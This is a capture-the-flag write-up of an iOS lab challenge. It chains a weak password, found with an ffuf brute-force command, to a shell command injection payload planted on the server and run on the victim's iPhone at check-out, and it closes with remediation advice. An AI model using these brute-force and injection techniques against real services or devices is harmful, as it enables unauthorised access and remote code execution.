---
title: "MHL Time Trap Writeup"
description: "A weak password lets an attacker plant a check-out record that the victim's own app runs as a shell command on their iPhone."
date: 2026-11-19 12:00:00 +0000
categories: [Mobile Hacking, iOS]
tags: [ios, mobile-hacking-lab, command-injection, brute-force, jwt, keychain, code-signing, swift, ghidra, radare2, burp, reverse-engineering]
---

## Overview

**Result:** remote command execution on a victim's iPhone as the `mobile` user, triggered by a record I planted on the server from my Kali box.

Time Trap (`com.mobilehackinglab.TimeTrap3`) is a Mobile Hacking Lab iOS challenge. It's an internal attendance app for the fictional Modern Slavery Inc: employees check in and check out, and the app logs each session to a backend at `https://mhl.pages.dev/time-trap/`. The goal is to find and exploit a command injection that runs commands on a victim's device.

The chain has five links:

1. Static analysis finds a client-side shell sink (`posix_spawn` running `/bin/sh -c`).
2. The sink builds its command from a field the server returns.
3. A weak password gives access to the victim account `emp002`.
4. The server stores whatever that account sends, with no validation.
5. The victim's own app reads the stored value and runs it at check-out.

![Attack chain](/assets/img/posts/mhl-time-trap/00-attack-chain.png)

The attacker never touches the victim's phone: the server carries the payload, and the victim's own Check Out runs it.

**Tools:** Ghidra, radare2 (`rabin2`), Burp Suite, ffuf, curl, `ldid` on a jailbroken iPhone (iOS 15, `iPhone9,2`).

## Static analysis

The binary carries its own shell runner, and it is fed from server data at check-out.

### Recon

`rabin2 -I` shows a stripped arm64 Swift binary, not encrypted. The imports stand out for an attendance app:

- `posix_spawn`, `posix_spawn_file_actions_adddup2`, `pipe`, `read`, `waitpid`: spawn a process and capture its stdout.
- `SecItemAdd`, `SecItemCopyMatching`, `SecItemDelete`: Keychain storage.
- A string `executeCommand` sits among the Swift symbols.

Two hardcoded endpoints appear in the strings: `/time-trap/login` and `/time-trap/attendance`. The attendance model `AttendanceDetails` has the fields `id`, `user_id`, `uname`, `check_in`, `check_out`.

### The sink: `executeCommand`

`executeCommand` takes a C string and runs it through the shell:

```c
argv = { "sh", "-c", param_1 };
pipe(fds);
posix_spawn_file_actions_adddup2(&fa, fds[1], 1);   // stdout -> pipe
posix_spawn(&pid, "/bin/sh", &fa, NULL, argv, NULL);
while ((n = read(fds[0], buf, 0x1000)) > 0)
    out = [[NSString alloc] initWithBytes:buf length:n encoding:4];
    NSLog(@"Output: %@", out);
```

Three details matter later:

- Only stdout is captured. A shell syntax error goes to stderr and the function returns an empty string.
- `out` is overwritten on each 4096-byte read, so only the last chunk is returned.
- Every chunk is written to the syslog as `Output: ...`.

### The caller: `AttendanceController.buttonPressed`

The check-in button has two branches, chosen by whether `startTime` is set.

**Check In** runs the fixed command `uname -a` and sends its output to the server with `updateAttendance(uname:)`. Nothing here is injectable.

**Check Out** takes `attendanceDetails.first`, reads its `uname`, and builds a command by string interpolation:

```
if [[ $(uname -a) != "<uname from server>" ]]; then uname -a; fi
```

The intent is a tamper check: has the device changed since check-in? The comparison value comes from the server and is pasted inside double quotes with no escaping. The result goes to `executeCommand`, then to `updateAttendance(uname:)`, and is shown in the `secure` label on screen.

Whoever controls the first attendance record controls a shell on the device that checks out.

## Authentication

The server checks the token strictly, so the way in is the weak password the hint points to.

### How the app authenticates

- `sendRequest` POSTs `{"username":...,"password":...}` as JSON to `/time-trap/login`.
- `saveJWTToken` stores the response body as a string in the Keychain: generic password, account `JWTToken`, `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.
- `getJWTToken` reads it back and parses it as JSON into `[String:String]`.
- `authenticatedRequest` takes the `token` key and sets `Authorization: Bearer <token>`.

The re-signed IPA had no `keychain-access-groups` entitlement, so `SecItemAdd` failed silently and login never stuck. Pseudo-signing the binary with `ldid -S` and an entitlements file that adds `application-identifier` and a matching access group fixed it:

```sh
APP=$(find /var/containers/Bundle/Application -maxdepth 2 -name "Time Trap.app" | head -1)
TEAM=9935WJZD4N
BID=com.mobilehackinglab.TimeTrap3
printf '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>application-identifier</key><string>%s.%s</string><key>com.apple.developer.team-identifier</key><string>%s</string><key>get-task-allow</key><true/><key>keychain-access-groups</key><array><string>%s.%s</string></array></dict></plist>' "$TEAM" "$BID" "$TEAM" "$TEAM" "$BID" > /var/root/timetrap-ents.plist
cp "$APP/Time Trap" /var/root/TimeTrap.bak
ldid -S/var/root/timetrap-ents.plist "$APP/Time Trap"
ldid -e "$APP/Time Trap"
```

### Probing the server

| Request to `/attendance` | Response |
| --- | --- |
| POST, no `Authorization` | 401 `Unauthorized` |
| POST, `Bearer ` (empty) | 401 `Unauthorized` |
| POST, `Bearer abc.def.ghi` | 401 `Unauthorized` |
| POST, `alg: none` JWT claiming `emp002` | 401 `Unauthorized` |
| GET, no auth | 402 `Method not allowed` |

Every bad token gets the same answer, so there's no oracle to work with. Login is just as uniform: a wrong password and an unknown user both return 401 with the 28-byte body `Invalid username or password`.

### Brute force

The 28-byte failure gives a clean ffuf filter:

```
ffuf -u https://mhl.pages.dev/time-trap/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"emp002","password":"FUZZ"}' \
  -w rock10k.txt -mc all -fs 28 -rate 10
```

The rockyou top 1000 and a 1,370-word targeted list found nothing. The rockyou top 10,000 hit `firefly` at position 3,850.

![ffuf hit on firefly](/assets/img/posts/mhl-time-trap/01-ffuf-firefly.png)

ffuf saw that request as a 500 (21 bytes), while the same login in Burp returned 200. Filtering out the known failure, instead of matching on 200, is what caught it.

![Login response with token](/assets/img/posts/mhl-time-trap/02-burp-login-token.png)

The login response:

```
{"user":"emp002","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImVtcDAwMiIsImlhdCI6MTc5NTEwMTU0MX0.b8CkkIyV3BGRo-bZcRGBjYdh-DwQvPbJ1U5ZWJTVEzg"}
```

The JWT is HS256 with the payload `{"username":"emp002","iat":1795101541}`. It has no `exp` claim, so it never expires.

## Exploitation

A `uname` value of `x" ]]; true; then id; fi #`, stored under `emp002`, ran `id` on the device at the next check-out.

### Payload design

The input lands inside double quotes in this template:

```
if [[ $(uname -a) != "<INPUT>" ]]; then uname -a; fi
```

The payload has to close the quote, close the `[[` test, run a command, and stop the rest of the template from breaking the syntax.

```
x" ]]; true; then id; fi #
```

After interpolation the shell sees:

```
if [[ $(uname -a) != "x" ]]; true; then id; fi #" ]]; then uname -a; fi
```

- `x"` closes the opening quote.
- `]]` closes the test.
- `true;` makes the `if` condition succeed even if `/bin/sh` doesn't support `[[`. Only the last command in the condition list decides the branch.
- `then id; fi` is the injected body.
- `#` comments out the leftover template.

Only `id` prints to stdout, which matters because `executeCommand` returns just the last 4 KB chunk.

Local test before planting (Kali's `sh` is dash, which has no `[[`, so test with bash):

```
u='x" ]]; true; then id; fi #'
cmd="if [[ \$(uname -a) != \"$u\" ]]; then uname -a; fi"
echo "$cmd"; bash -c "$cmd"
```

### Planting

I intercepted the app's own Check In POST in Burp and replaced its body:

```
POST /time-trap/attendance HTTP/2
Host: mhl.pages.dev
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer <emp002 token>

{"uname":"x\" ]]; true; then id; fi #"}
```

![Working payload stored](/assets/img/posts/mhl-time-trap/06-plant-working-payload.png)

The server stored it verbatim and returned the new record (`id` 629) with the hint `You are in the right direction. Keep going!`. The app declares the body as form-encoded while sending JSON; the server parses it anyway.

### Trigger

The attendance list is ordered newest first, so the planted record is `attendanceDetails.first`. After the app reloaded the list, tapping Check Out ran the payload. The `secure` label showed:

```
uid=501(mobile) gid=501(mobile) groups=501(mobile),250(_analyticsusers),286(_accessory_mobile_share),299(systemusers)
```

![RCE on the device](/assets/img/posts/mhl-time-trap/07-device-rce-uid.png)

The app then sent the output back to `/attendance` as the next `uname` (record 630), so the attacker can read the result straight from the server.

### What failed first

| Attempt | Result | Cause |
| --- | --- | --- |
| `x" ]]; id; fi #` | Empty label | `then` missing: a syntax error, hidden because stderr isn't captured |
| `x" ]]; whoami; fi #` | Empty label | Same missing `then` |
| `x" ]]; true; then id; fi #` (first send) | 500 `Failed to insert attendance` | Transient server error; the same body succeeded on resend |
| `x" ]]; true; then id; fi #` | `uid=501(mobile)` | Working payload |

The first attempt stored fine, but the device showed an empty label after Check Out:

![Payload without then](/assets/img/posts/mhl-time-trap/03-plant-missing-then.png)

![Empty label after Check Out](/assets/img/posts/mhl-time-trap/04-device-empty-label.png)

And the transient 500:

![Insert 500](/assets/img/posts/mhl-time-trap/05-insert-500.png)

### About the flag

Every insert returned only the hint `You are in the right direction. Keep going!` (records 629 to 650). The server's flag check appears to have changed or broken. The challenge objective, RCE through command injection, is met.

## Findings and remediation

The root cause is on the client: it builds a shell command from server data. Every other finding made that easier to reach.

| # | Finding | Severity | Fix |
| --- | --- | --- | --- |
| 1 | Server-supplied `uname` interpolated into `sh -c` at check-out | Critical | Compare in Swift (`utsname` via `uname()`), never spawn a shell; if a process is unavoidable, pass arguments as an array, not a string |
| 2 | Server stores any `uname` value with no validation | High | Validate the format server-side; reject quotes, `;`, `$`, backticks and newlines |
| 3 | Weak password (`firefly`) and no lockout or rate limit on login | High | Password policy, lockout or backoff, rate limiting |
| 4 | Command output sent back to the server automatically | Medium | Remove; it turns blind execution into a readable channel |
| 5 | JWT has no `exp` claim | Medium | Short expiry plus refresh tokens |
| 6 | Full `uname -a` (kernel, model, hostname) uploaded on every check-in | Low | Send only what the check needs, or a hash |
| 7 | `updateAttendance` sends JSON as `application/x-www-form-urlencoded`; GET returns 402 instead of 405 | Info | Set `Content-Type: application/json`; return correct status codes |

Why it matters beyond the lab: the attacker never touches the victim's device. A single stored record, written with one account's credentials, runs code on whichever device next checks out against it. Command injection is rare in iOS apps, but any client that hands server data to `posix_spawn`, `system` or a WebView bridge carries the same risk.
